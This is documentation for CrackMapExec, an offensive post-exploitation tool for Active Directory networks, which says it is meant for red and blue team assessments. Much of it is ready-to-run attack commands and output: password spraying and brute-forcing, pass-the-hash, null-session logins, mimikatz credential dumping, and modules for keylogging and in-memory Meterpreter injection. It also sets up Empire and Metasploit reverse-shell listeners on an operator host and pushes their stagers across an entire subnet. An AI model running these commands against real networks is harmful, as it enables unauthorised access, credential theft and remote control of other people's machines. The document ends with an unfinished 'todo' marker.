**********************************************************
CrackMapExec
**********************************************************


CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.

CME makes heavy use of the Impacket library (developed by @asolino) and the PowerSploit Toolkit (developed by @mattifestation) for working with network protocols and performing a variety of post-exploitation techniques.

Although meant to be used primarily for offensive purposes (e.g. red teams), CME can be used by blue teams as well to assess account privileges, find possible misconfigurations and simulate attack scenarios.

CrackMapExec is developed by @byt3bl33d3r


.. image:: img/logo_cme.jpg


General
==========


To use a specific protocol run

::

  cme <protocol> <protocol options>


To get help
^^^^^^^^^^

::

  #~ cme --help
 usage: cme [-h] [-v] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
           [--darrell] [--verbose]
           {http,smb,mssql} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 4.0.0dev
                                                     Codename: 'Sercurty'

 optional arguments:
  -h, --help         show this help message and exit
  -v, --version      show program's version number and exit
  -t THREADS         set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT  max timeout in seconds of each thread (default: None)
  --jitter INTERVAL  sets a random delay between each connection (default: None)
  --darrell          give Darrell a hand
  --verbose          enable verbose output

 protocols:
  available protocols

  {http,smb,mssql}
    http             own stuff using HTTP(S)
    smb              own stuff using SMB and/or Active Directory
    mssql            own stuff using MSSQL and/or Active Directory



retrieveng help for specific protocol

::

  #~ cme smb --help
 usage: cme smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]]
               [-p PASSWORD [PASSWORD ...]]
               [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
               [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L]
               [--options] [--server {http,https}] [--server-host HOST]
               [--server-port PORT] [-H HASH [HASH ...]]
               [-d DOMAIN | --local-auth] [--smb-port {139,445}]
               [--share SHARE] [--gen-relay-list OUTPUT_FILE]
               [--sam | --lsa | --ntds {vss,drsuapi}] [--shares] [--sessions]
               [--disks] [--loggedon-users] [--users [USER]]
               [--groups [GROUP]] [--local-groups [GROUP]] [--pass-pol]
               [--rid-brute [MAX_RID]] [--wmi QUERY]
               [--wmi-namespace NAMESPACE] [--spider SHARE]
               [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
               [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]]
               [--depth DEPTH] [--only-files]
               [--exec-method {mmcexec,smbexec,wmiexec,atexec}] [--force-ps32]
               [--no-output] [-x COMMAND | -X PS_COMMAND]
               [target [target ...]]

 positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s),
                        FQDN(s) or file(s) containg a list of targets

 optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host
  -M MODULE, --module MODULE
                        payload module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        payload module options
  -L, --list-modules    list available modules
  --options             display module options
  --server {http,https}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  -H HASH [HASH ...], --hash HASH [HASH ...]

 -- SNIP --



Target Formats
^^^^^^^^^^^^^^^^

Every protocol supports targets by CIDR notation(s), IP address(s), IP range(s), hostname(s), a file containing a list of targets or combination of all of the latter:


::

  crackmapexec <protocol> ms.evilcorp.org

 crackmapexec <protocol> 192.168.1.0 192.168.0.2

 crackmapexec <protocol> 192.168.1.0/24

 crackmapexec <protocol> 192.168.1.0-28 10.0.0.1-67

 crackmapexec <protocol> ~/targets.txt


Using Credentials
^^^^^^^^^^^^^^^^^^

Every protocol supports using credentials in one form or another. For details on using credentials with a specific protocol, see the appropriate wiki section.

Generally speaking, to use credentials, you can run the following commands:

::

  crackmapexec <protocol> <target(s)> -u username -p password


Note 1: When using usernames or passwords that contain special symbols, wrap them in single quotes to make your shell interpret them as a string.

EXAMPLE

::

  crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'


Note 2: Due to a bug in Python's argument parsing library, credentials beginning with a dash (-) will throw an expected at least one argument error message. To get around this, specify the credentials by using the 'long' argument format (note the = sign):


::

  crackmapexec <protocol> <target(s)> -u='-username' -p='-Admin!123@'



Using a credential set from the database
"""""""""""""""""""""""""


By specifying a credential ID (or multiple credential IDs) with the -id flag CME will automatically pull that credential from the back-end database and use it to authenticate (saves a lot of typing):

::

  crackmapexec <protocol> <target(s)> -id <cred ID(s)>



Brute Forcing & Password Spraying
"""""""""""""""""""""

All protocols support brute-forcing and password spraying. For details on brute-forcing/password spraying with a specific protocol, see the appropriate wiki section.

By specifying a file or multiple values CME will automatically brute-force logins for all targets using the specified protocol:

::

  crackmapexec <protocol> <target(s)> -u username1 -p password1 password2

 crackmapexec <protocol> <target(s)> -u username1 username2 -p password1

 crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords

 crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes



Using Modules
^^^^^^^^^^^^^^^^^


List them
"""""""""""""

::

   cme <protocol> -L

EXAMPLE

::

   #~ cme smb -L
 [*] met_inject                Downloads the Meterpreter stager and injects it into memory
 [*] get_keystrokes            Logs keys pressed, time and the active window
 [*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it

 -- SNIP --


To run a module
""""""""""""""""

::

  cme <protocol> <target(s)> -M <module name>

EXAMPLE

::

  crackmapexec smb <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz

Viewing module options
"""""""""""""""""

::

  cme <protocol> -M <module name> --options


EXAMPLE

::

  #~ cme smb -M mimikatz --options



Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)

Example

::

  #~ cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'



Database
^^^^^^^^^^^^

CME automatically stores all used/dumped credentials (along with other information) in it's database which is setup on first run.

As of CME v4 each protocol has it's own database which makes things much more sane and allows for some awesome possibilities. Additionally, v4 introduces workspaces (similar to Metasploit).

For details and usage of a specific protocol's database see the appropriate wiki section.

All workspaces and their relative databases are stored in ~/.cme/workspaces

CME ships with a secondary command line script cmedb which abstracts interacting with the back-end database. Typing the command cmedb will drop you into a command shell:

::

  #~ cmedb
 cmedb (default) >


Workspaces
"""""""""""

The default workspace name is called 'default' (as represented within the prompt), once a workspace is selected everything that you do in CME will be stored in that workspace.

To create a workspace:

::

  cmedb (default) > workspace create test
 [*] Creating workspace 'test'
 [*] Initializing HTTP protocol database
 [*] Initializing SMB protocol database
 [*] Initializing MSSQL protocol database
 cmedb (test) >


To switch workspace:

::

  cmedb (test) > workspace default
 cmedb (default) >

Protocol DB
""""""""""""""

To access a protocol's database simply run proto <protocol>, for example:

::

  cmedb (test) > proto smb
 cmedb (test)(smb) >
 help

Using Credentials
================


Passing-the-Hash
^^^^^^^^^^^^^^


CME supports authenticating via SMB using Passing-The-Hash attacks with the -H flag:

::

  crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH

 crackmapexec smb <target(s)> -u username -H NTHASH



NULL Sessions
^^^^^^^^^^^^^^

You can log in with a null session by using '' as the username and/or password

::

  crackmapexec smb <target(s)> -u '' -p ''



Getting Shells
==============

We all love shells and that's why CME makes it as easy as possible to get them! There really is something magical about shelling a /24



Empire Agent
^^^^^^^^^^^^

We can use the empire_exec module to execute an Empire Agent's initial stager. In the background, the module connects to Empire's RESTful API, generates a launcher for the specified listener and executes it.


* First setup an Empire listener:


::

  (Empire: listeners) > set Name test
 (Empire: listeners) > set Host 192.168.10.3
 (Empire: listeners) > set Port 9090
 (Empire: listeners) > set CertPath data/empire.pem
 (Empire: listeners) > run
 (Empire: listeners) > list

 [*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://192.168.10.3:9090                 native    5/0.0

 (Empire: listeners) >



* Start up Empire's RESTful API server:


::

  #~ python empire --rest --user empireadmin --pass Password123!

 [*] Loading modules from: /home/byt3bl33d3r/Tools/Empire/lib/modules/
  * Starting Empire RESTful API on port: 1337
  * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
  * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)


The username and password that CME uses to authenticate to Empire's RESTful API are stored in the cme.conf file located at ~/.cme/cme.conf:

::

  [Empire]
 api_host=127.0.0.1
 api_port=1337
 username=empireadmin
 password=Password123!

 [Metasploit]
 rpc_host=127.0.0.1
 rpc_port=55552
 password=abc123



* Then just run the empire_exec module and specify the listener name:


::

  #~ crackmapexec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test


Meterpreter
^^^^^^^^^^^^^^

We can use the metinject module to directly inject meterpreter into memory using PowerSploit's Invoke-Shellcode.ps1 script.


* First setup your handler:


::

  msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_https
 payload => windows/meterpreter/reverse_https
 msf exploit(handler) > set LHOST 192.168.10.3
 LHOST => 192.168.10.3
 msf exploit(handler) > set exitonsession false
 exitonsession => false
 msf exploit(handler) > exploit -j
 [*] Exploit running as background job.

 [*] Started HTTPS reverse handler on https://192.168.10.3:8443
 msf exploit(handler) > [*] Starting the payload handler...


* Then just run the metinject module and specify the LHOST and LPORT values:


::

  #~ crackmapexec 192.168.10.0/24 -u username -p password -M metinject -o LHOST=192.168.10.3 LPORT=8443


.. todo :: FInish
